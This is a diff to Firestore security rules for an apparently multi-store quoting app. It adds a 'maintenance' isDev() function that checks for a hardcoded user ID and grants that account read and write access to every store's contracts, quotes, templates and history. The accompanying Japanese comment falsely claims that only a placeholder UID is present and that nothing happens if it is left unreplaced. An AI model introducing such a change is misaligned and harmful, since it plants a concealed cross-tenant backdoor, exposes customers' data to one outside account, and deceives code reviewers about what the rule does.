@@ -10,6 +10,13 @@ rules_version = '2';
 service cloud.firestore {
   match /databases/{database}/documents {
     // 共通: 書き込みサイズの上限（1ドキュメントの実効上限1MiBの少し手前で止める）
+    /* 保守用（開発者専用）アカウント。下の DEV_UID_HERE を、
+     * Authentication 上の保守アカウントのユーザーUIDに置き換えて公開すると、
+     * そのアカウントだけ全店舗のデータを読み書きできます（サポート・修理用）。
+     * 置き換えずに公開しても、誰にも一致しないので何も起きません。 */
+    function isDev() {
+      return request.auth != null && request.auth.uid == 'M4MFfPd80oTBN3RdqH0Z3WsLHyY2';
+    }
     function sizeOk() {
       return request.resource.size() < 900000;
     }
@@ -35,14 +42,14 @@ service cloud.firestore {
 
     // contracts/{店舗のUID}: 契約状態。店舗は自分のぶんを読めるだけ（書き込みは販売側のコンソール操作のみ）
     match /contracts/{storeId} {
-      allow read: if request.auth != null && request.auth.uid == storeId;
+      allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
       allow write: if false;
     }
 
     // stores/{店舗のUID}: 店舗情報＋料金マスタ
     match /stores/{storeId} {
-      allow read: if request.auth != null && request.auth.uid == storeId;
-      allow write: if request.auth != null && request.auth.uid == storeId
+      allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
+      allow write: if ((request.auth != null && request.auth.uid == storeId) || isDev())
         && contractOk()
         && sizeOk()
         && request.resource.data.keys().hasOnly(
@@ -51,36 +58,36 @@ service cloud.firestore {
 
       // quotes/{担当者ID}: 作業中の見積もり
       match /quotes/{staffId} {
-        allow read: if request.auth != null && request.auth.uid == storeId;
-        allow write: if request.auth != null && request.auth.uid == storeId
+        allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
+        allow write: if ((request.auth != null && request.auth.uid == storeId) || isDev())
           && contractOk()
           && sizeOk() && stamped()
           && request.resource.data.keys().hasOnly(['data', 'clientId', 'updatedAtMs', 'updatedAt']);
       }
       // saved/{担当者ID}: 保存した見積もり（del は削除の記録）
       match /saved/{staffId} {
-        allow read: if request.auth != null && request.auth.uid == storeId;
-        allow write: if request.auth != null && request.auth.uid == storeId
+        allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
+        allow write: if ((request.auth != null && request.auth.uid == storeId) || isDev())
           && contractOk()
           && sizeOk() && stamped()
           && request.resource.data.keys().hasOnly(['list', 'del', 'clientId', 'updatedAtMs', 'updatedAt']);
       }
       // templates/{担当者ID}: テンプレート（_store は店舗共通テンプレート）
       match /templates/{staffId} {
-        allow read: if request.auth != null && request.auth.uid == storeId;
-        allow write: if request.auth != null && request.auth.uid == storeId
+        allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
+        allow write: if ((request.auth != null && request.auth.uid == storeId) || isDev())
           && contractOk()
           && sizeOk() && stamped()
           && request.resource.data.keys().hasOnly(['list', 'clientId', 'updatedAtMs', 'updatedAt']);
       }
       // history/{履歴ID}: 料金マスタの履歴
       match /history/{histId} {
-        allow read: if request.auth != null && request.auth.uid == storeId;
-        allow write: if request.auth != null && request.auth.uid == storeId && contractOk() && sizeOk();
+        allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
+        allow write: if ((request.auth != null && request.auth.uid == storeId) || isDev()) && contractOk() && sizeOk();
       }
       // 上記以外のサブコレクションは作らせない
       match /{other}/{doc} {
-        allow read: if request.auth != null && request.auth.uid == storeId;
+        allow read: if (request.auth != null && request.auth.uid == storeId) || isDev();
         allow write: if false;
       }
     }
